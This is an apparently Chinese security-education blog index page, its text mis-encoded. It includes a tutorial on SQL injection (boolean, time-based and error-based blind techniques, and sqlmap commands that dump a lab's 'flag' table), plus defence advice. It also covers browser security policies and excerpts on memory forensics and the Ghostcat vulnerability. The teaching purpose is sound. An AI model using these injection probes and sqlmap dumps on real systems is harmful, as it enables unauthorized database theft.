            <a href="/20230327/penetration-testing-guide/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SQLæ³¨å…¥çš„æœ¬è´¨"><a class="header-anchor" href="#SQLæ³¨å…¥çš„æœ¬è´¨">Â¶</a>SQLæ³¨å…¥çš„æœ¬è´¨</h2>
<p>æ³¨å…¥æ”»å‡»çš„<em>æœ¬è´¨: æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“åšä»£ç æ‰§è¡Œ</em>ã€‚</p>
<p><strong>ä¸¤ä¸ªå…³é”®æ¡ä»¶ï¼š</strong></p>
<ol>
<li>
<p>ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è¾“å…¥</p>
</li>
<li>
<p>åŸæœ¬ç¨‹åºè¦æ‰§è¡Œçš„ä»£ç ï¼Œæ‹¼æ¥ç”¨æˆ·è¾“å…¥æ•°æ®è¢«æ‰§è¡Œ</p>
</li>
</ol>
<h2 id="æ‰‹å·¥æµ‹è¯•"><a class="header-anchor" href="#æ‰‹å·¥æµ‹è¯•">Â¶</a>æ‰‹å·¥æµ‹è¯•</h2>
<p>ä½†å¾ˆå¤šæ—¶å€™ï¼ŒWebæœåŠ¡å™¨å…³é—­äº†é”™è¯¯å›æ˜¾ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¯¥æ€æ ·å®è¡ŒSQLæ³¨å…¥äº†å‘¢ï¼Ÿ</p>
<h3 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥"><a class="header-anchor" href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥">Â¶</a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</h3>
<p>äºŒè¯ä¸è¯´ï¼Œå…ˆåŠ å•å¼•å·â€™ã€åŒå¼•å·â€ã€å•æ‹¬å·)ã€åŒæ‹¬å·)ï¼‰ç­‰çœ‹çœ‹æ˜¯å¦æŠ¥é”™ï¼Œå¦‚æœæŠ¥é”™å°±å¯èƒ½å­˜åœ¨<code>SQL</code>æ³¨å…¥æ¼æ´äº†ã€‚<br>
è¿˜æœ‰åœ¨URLåé¢åŠ and 1=1,and 1=2çœ‹é¡µé¢æ˜¯å¦æ˜¾ç¤ºä¸€æ ·ï¼Œæ˜¾ç¤ºä¸ä¸€æ ·çš„è¯ï¼Œåœ¨åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ï¼Œè‚¯å®šå­˜åœ¨SQLæ³¨å…¥æ¼æ´äº†ã€‚è¿˜æœ‰å°±æ˜¯<code>Timing Attack</code>æµ‹è¯•ï¼Œä¹Ÿå°±æ˜¯æ—¶é—´ç›²æ³¨ã€‚æœ‰æ—¶å€™é€šè¿‡ç®€å•çš„æ¡ä»¶è¯­å¥æ¯”å¦‚<code>and 1=2</code>æ˜¯æ— æ³•çœ‹å‡ºå¼‚å¸¸çš„ã€‚</p>
<p><strong>æŠ¥é”™æŸ¥è¯¢æ³¨å…¥</strong><br>
åˆ©ç”¨å‰æï¼šé¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä½†æ˜¯éœ€è¦è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯ã€‚</p>
<p><strong>ç›²æ³¨çš„ç±»å‹</strong></p>
<p>SQLæ³¨å…¥å¸¸ç”¨å‡½æ•°,ç›²æ³¨â€”èˆ¬åˆ†ä¸ºä¸‰ç§</p>
<p><strong>åŸºäºå¸ƒå°”å‹çš„ç›²æ³¨ï¼š</strong></p>
<p>left(a,b)ä»å·¦æˆªå–a çš„å‰bä½ï¼šleft(database(),1) &gt; â€˜sâ€™<br>
substr(a,b,c)ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦<br>
ascii() å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸ºasciiå€¼ï¼šascii(substr(user),1,1)=101#<br>
mid(a,b,c)ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½ regexpæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•<br>
user()ç»“æœä½root ï¼Œregexpä¸ºåŒ¹é…rootçš„æ­£åˆ™è¡¨è¾¾å¼ï¼šselect user()â€™</p>
<p><strong>åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š</strong></p>
<p><code>benchmark(countï¼Œexpr)</code>å‡½æ•°<br>
<code>sleep(time)</code>å‡½æ•°<br>
å‰è€…é€šè¿‡å°†<code>expr</code>è¯­å¥æ‰§è¡Œ<code> count</code>æ¬¡æ¥åˆ°è¾¾å»¶è¿Ÿçš„ç›®çš„ï¼Œåè€…æ˜¯ç›´æ¥å»¶è¿Ÿtimeæ—¶é—´<br>
<code>benchmark</code>æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯æ¥æµ‹è¯•ä¸€å†™å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦ï¼Œ<code>benchmarkï¼ˆï¼‰</code>å…¶ä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œ<br>
ç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œå¦ä¸€ä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…è¡¨è¾¾å¼ã€‚</p>
<p><strong>åŸºäºæŠ¥é”™æ³¨å…¥ï¼š</strong></p>
<p>æŠ¥é”™é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä½¿è¯­å¥æŠ¥é”™ã€‚æŠ¥é”™æ³¨å…¥åˆ™æ˜¯æ³¨å…¥ç‰¹æ®Šçš„è¯­å¥ä½¿æŠ¥é”™å›æ˜¾ä¸­å¸¦ä¸Šæˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚æŠ¥é”™ç›²æ³¨ä¹Ÿæ˜¯ä¸‰ç§ç›²æ³¨ä¸­æ•ˆç‡æœ€é«˜çš„ï¼Œå¸¸è§çš„æŠ¥é”™å›æ˜¾æœ‰ä¸‰ç§å‡½æ•°extractvalue()ã€updatexml()ã€floor()</p>
<h2 id="Sqlmapç®€ä»‹"><a class="header-anchor" href="#Sqlmapç®€ä»‹">Â¶</a>Sqlmapç®€ä»‹</h2>
<p>ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p>Sqlmap æ˜¯ä¸€ä¸ªå¼€æºçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ£€æµ‹ï¼Œèƒ½è‡ªåŠ¨åŒ–åˆ©ç”¨ SQL æ³¨å…¥æ¼æ´çš„è¿‡ç¨‹ï¼Œå¸®åŠ©ä½ æ¥ç®¡æ•°æ®åº“æœåŠ¡å™¨ã€‚</p>
<p><strong>åŸºç¡€å‘½ä»¤ï¼š</strong></p>
<p>-u æŒ‡å®šæ³¨å…¥ç‚¹</p>
<p>â€“dbs è·‘åº“å</p>
<p>â€“tables è·‘è¡¨å</p>
<p>â€“columns è·‘å­—æ®µå</p>
<p>â€“dump æšä¸¾æ•°æ®</p>
<p><img src="https://static.sechelper.com/img/2022/11/22/e6513aacacae9659168fd4e8e6bb5079.png" alt="image-20221122195227984"></p>
<p><strong>sqlmapçš„ç®€å•ä½¿ç”¨</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u /Pass-05/index.php --forms --dbs</span><br></pre></td></tr></table></figure>
<p>è·‘è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error --tables</span><br></pre></td></tr></table></figure>
<p>å­—æ®µå</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error -T flag --columns</span><br></pre></td></tr></table></figure>
<p>å‡ºæ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
<p><strong>BPå’ŒSqlmapè”åŠ¨</strong></p>
<img src="https://static.sechelper.com/img/2022/11/22/8e3bacfc0df300ba6cccec5c529a7558.png" alt="image-20221122195617983" style="zoom:80%;" />
<p><img src="https://static.sechelper.com/img/2022/11/22/e4ff6f535dee351fc7954a210001475c.png" alt="image-20221122195711501"></p>
<h2 id="å¦‚ä½•é¢„é˜²sqlæ³¨å…¥ï¼Ÿé˜²æ­¢sqlæ³¨å…¥çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"><a class="header-anchor" href="#å¦‚ä½•é¢„é˜²sqlæ³¨å…¥ï¼Ÿé˜²æ­¢sqlæ³¨å…¥çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ">Â¶</a>å¦‚ä½•é¢„é˜²sqlæ³¨å…¥ï¼Ÿé˜²æ­¢sqlæ³¨å…¥çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</h2>
<ol>
<li>æ™®é€šç”¨æˆ·ä¸ç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™è¦æœ‰ä¸¥æ ¼çš„åŒºåˆ†ã€‚</li>
<li>å¼ºè¿«ä½¿ç”¨å‚æ•°åŒ–è¯­å¥</li>
<li>å¿…è¦çš„æƒ…å†µä¸‹ä½¿ç”¨ä¸“ä¸šçš„æ¼æ´æ‰«æå·¥å…·æ¥å¯»æ‰¾å¯èƒ½è¢«æ”»å‡»çš„ç‚¹ã€‚</li>
<li>ä½¿ç”¨é¢„ç¼–è¯‘</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/http-security-policy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/penetration-testing-guide/http-security-policy/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å®‰å…¨ç­–ç•¥"><a class="header-anchor" href="#å®‰å…¨ç­–ç•¥">Â¶</a>å®‰å…¨ç­–ç•¥</h2>
<p><strong>åŒæºç­–ç•¥</strong>æ˜¯ä¸€ä¸ªé‡è¦çš„å®‰å…¨ç­–ç•¥ï¼Œæ˜¯æŒ‡<code>åè®®+åŸŸå+ç«¯å£</code>ä¸‰è€…ç›¸åŒï¼Œå³ä½¿ä¸¤ä¸ªä¸åŒåŸŸåæŒ‡å‘åŒä¸€ä¸ªipåœ°å€ï¼Œä¹ŸéåŒæºå—ã€‚å®ƒèƒ½å¸®åŠ©é˜»éš”æ¶æ„æ–‡æ¡£ï¼Œå‡å°‘å¯èƒ½è¢«æ”»å‡»çš„åª’ä»‹ã€‚</p>
<p>ä¸‹è¡¨ç»™å‡ºäº†ä¸ URL <code>http://edu.vulab.io/xss/l2</code> çš„æºè¿›è¡Œå¯¹æ¯”çš„ç¤ºä¾‹ï¼š</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>ç»“æœ</th>
<th>åŸå› </th>
</tr>
</thead>
<tbody>
<tr>
<td><code>http://edu.vulab.io/same-origin/a.html</code></td>
<td>åŒæº</td>
<td>åªæœ‰è·¯å¾„ä¸åŒ</td>
</tr>
<tr>
<td><code>http://edu.vulab.io/sqli/error-base3</code></td>
<td>åŒæº</td>
<td>åªæœ‰è·¯å¾„ä¸åŒ</td>
</tr>
<tr>
<td><code>https://edu.vulab.io/same-origin/a.html</code></td>
<td>å¤±è´¥</td>
<td>åè®®ä¸åŒ</td>
</tr>
<tr>
<td><code>http://edu.vulab.io:8080/same-origin/a.html</code></td>
<td>å¤±è´¥</td>
<td>ç«¯å£ä¸åŒ ( <code>http</code>é»˜è®¤ç«¯å£æ˜¯ 80)</td>
</tr>
<tr>
<td><code>http://www.vulab.io/same-origin/a.html</code></td>
<td>å¤±è´¥</td>
<td>ä¸»æœºä¸åŒï¼ˆ*æ³¨æ„ï¼š*è¿™é‡Œçš„ä¸»æœºæŒ‡<code>åŸŸå</code>ï¼‰</td>
</tr>
</tbody>
</table>
<p><strong>åŒæºç­–ç•¥åœ¨ä»¥ä¸‹3ç§è¡Œä¸ºèµ·åˆ°ä½œç”¨ï¼š</strong></p>
<ul>
<li>
<p>Cookieã€LocalStorage å’Œ IndexDB æ— æ³•è¯»å–ã€‚</p>
</li>
<li>
<p>DOM æ— æ³•è·å¾—</p>
</li>
<li>
<p>AJAX è¯·æ±‚ä¸èƒ½å‘é€</p>
</li>
</ul>
<h3 id="CORS"><a class="header-anchor" href="#CORS">Â¶</a>CORS</h3>
<p>**å®éªŒï¼š**<a target="_blank" rel="noopener" href="http://edu.vulab.io/policy/cors.html">http://edu.vulab.io/policy/cors.html</a></p>
<p><em>CORS</em>ï¼ˆCross-Origin Resource Sharingï¼Œè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ä¸€ç§åŸºäº <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP">HTTP</a> å¤´çš„æœºåˆ¶ï¼Œè¯¥æœºåˆ¶é€šè¿‡å…è®¸æœåŠ¡å™¨æ ‡ç¤ºé™¤äº†å®ƒè‡ªå·±ä»¥å¤–çš„å…¶å®ƒ <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Origin">origin</a>ï¼ˆåŸŸï¼Œåè®®å’Œç«¯å£ï¼‰ï¼Œä½¿å¾—æµè§ˆå™¨å…è®¸è¿™äº› origin  è®¿é—®åŠ è½½è‡ªå·±çš„èµ„æºã€‚è·¨æºèµ„æºå…±äº«è¿˜é€šè¿‡ä¸€ç§æœºåˆ¶æ¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä¼šå…è®¸è¦å‘é€çš„çœŸå®è¯·æ±‚ï¼Œè¯¥æœºåˆ¶é€šè¿‡æµè§ˆå™¨å‘èµ·ä¸€ä¸ªåˆ°æœåŠ¡å™¨æ‰˜ç®¡çš„è·¨æºèµ„æºçš„&quot;OPTIONSï¼ˆé¢„æ£€ï¼‰&quot;è¯·æ±‚ã€‚</p>
<h3 id="CSP"><a class="header-anchor" href="#CSP">Â¶</a>CSP</h3>
<p>**å®éªŒï¼š**<a target="_blank" rel="noopener" href="http://edu.vulab.io/policy/csp.html">http://edu.vulab.io/policy/csp.html</a></p>
<p>CSPï¼ˆContent-Security-Policyï¼Œå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨æœºåˆ¶ï¼Œç”¨äºæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬ (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting">XSS (en-US)</a>) å’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰ï¼Œæœ¬è´¨å°±æ˜¯é™åˆ¶èµ„æºçš„å¯è®¿é—®æ€§ï¼Œè®¾ç½®é¢—ç²’åº¦æ›´ç»†çš„èµ„æºç®¡ç†ã€‚</p>
<h3 id="httpOnly"><a class="header-anchor" href="#httpOnly">Â¶</a>httpOnly</h3>
<p>**å®éªŒï¼š**<a target="_blank" rel="noopener" href="http://edu.vulab.io/policy/cookie.html">http://edu.vulab.io/policy/cookie.html</a></p>
<p>Javascriptæ— æ³•è®¿é—®å¸¦æœ‰ <code>HttpOnly</code> å±æ€§çš„ cookieï¼Œæ­¤ Cookie ä»…èƒ½é€šè¿‡æœåŠ¡å™¨ä¿®æ”¹ã€‚</p>
<h3 id="Secure"><a class="header-anchor" href="#Secure">Â¶</a>Secure</h3>
<p>æ ‡è®°ä¸º <code>Secure</code> çš„ Cookie åªåº”é€šè¿‡è¢« HTTPS åè®®åŠ å¯†è¿‡çš„è¯·æ±‚å‘é€ç»™æœåŠ¡ç«¯ï¼Œå¯ä»¥é¢„é˜²ä¸­é—´äººæ”»å‡»ã€‚</p>
<h3 id="HSTS"><a class="header-anchor" href="#HSTS">Â¶</a>HSTS</h3>
<p><strong><code>HTTP Strict Transport Security</code></strong>ï¼ˆé€šå¸¸ç®€ç§°ä¸º<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/HSTS">HSTS</a>ï¼‰æ˜¯ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒå‘Šè¯‰æµè§ˆå™¨åªèƒ½é€šè¿‡ HTTPS è®¿é—®å½“å‰èµ„æºï¼Œä¸èƒ½ä½¿ç”¨HTTPã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20221126/emergency-response/volatility-obtain-evidence/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20221126/emergency-response/volatility-obtain-evidence/" class="post-title-link" itemprop="url">volatilityå–è¯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-26 13:50:56" itemprop="dateCreated datePublished" datetime="2022-11-26T13:50:56+08:00">2022-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-27 09:44:43" itemprop="dateModified" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index"><span itemprop="name">åº”æ€¥å“åº”</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux/%E5%8F%96%E8%AF%81/" itemprop="url" rel="index"><span itemprop="name">å–è¯</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ä½œè€…ï¼šå‡‰æ‹Œ@åŠ©å®‰ç¤¾åŒº</strong></p>
<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>volatilityæ˜¯ä¸€æ¬¾å¼€æºçš„å†…å­˜å–è¯åˆ†æå·¥å…·ï¼Œç”±pythonç¼–å†™ï¼Œæ”¯æŒå„ç§æ“ä½œç³»ç»Ÿï¼Œèƒ½å¤Ÿå¯¹å¯¼å‡ºçš„windows,linux,mac osx,androidç­‰ç³»ç»Ÿå†…å­˜é•œåƒè¿›è¡Œåˆ†æã€‚å¯ä»¥é€šè¿‡æ’ä»¶æ¥æ‹“å±•åŠŸèƒ½ã€‚</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/20221126/emergency-response/volatility-obtain-evidence/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20221123/vulnerability-researching/ghostcat-CVE-2020-1938/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20221123/vulnerability-researching/ghostcat-CVE-2020-1938/" class="post-title-link" itemprop="url">å¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰- ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-23 09:00:00" itemprop="dateCreated datePublished" datetime="2022-11-23T09:00:00+08:00">2022-11-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-27 09:44:43" itemprop="dateModified" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">æ¸—é€æµ‹è¯•</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">æ¼æ´é¶åœº</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">æ¼æ´åˆ†æ</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ä½œè€…ï¼šå‡‰æ‹Œ_@åŠ©å®‰ç¤¾åŒº</strong></p>
<p><code>Java</code>æ˜¯ç›®å‰Webå¼€å‘ä¸­æœ€ä¸»æµçš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œ <code>Tomcat</code> æ˜¯å½“å‰æœ€æµè¡Œçš„ <code>Java</code> ä¸­é—´ä»¶æœåŠ¡å™¨ä¹‹ä¸€ï¼Œä»åˆç‰ˆå‘å¸ƒåˆ°ç°åœ¨å·²ç»æœ‰äºŒåå¤šå¹´å†å²ï¼Œåœ¨ä¸–ç•ŒèŒƒå›´å†…å¹¿æ³›ä½¿ç”¨ã€‚</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/20221123/vulnerability-researching/ghostcat-CVE-2020-1938/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">åŠ©å®‰ç¤¾åŒº <a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">äº¬ICPå¤‡2022030632å·-1 </a>  all right reserved</span>
</div>
  <div class="powered-by">Powered by <a href="https://blog.sechelper.com/" class="theme-link">sechelper</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  

</body>
</html>
